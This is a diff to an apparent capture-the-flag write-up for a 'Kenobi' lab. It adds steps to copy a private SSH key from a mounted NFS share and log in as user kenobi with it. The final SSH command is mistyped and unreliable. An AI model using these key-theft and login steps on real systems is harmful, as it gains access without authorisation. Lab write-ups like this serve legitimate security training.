@@ -241,10 +241,19 @@ mount 10.10.101.17:/var /mnt/kenobiNFS
 ```
 ls -la /mnt/kenobiNFS
 ```
-
-
-
-
+### If u get any error doing this just install ```showmount``` command and all it pkg will start downloading with it.
+### Copy id_rsa
+```
+cp /mnt/kenobiNFS/tmp/id_rsa .
+```
+### Change the permissions using chmod:
+```
+chmod 600 id_rsa
+```
+### Let log In using SSH
+```
+ssh kenobi@Ip -i id/-rsa
+```
 
 
 
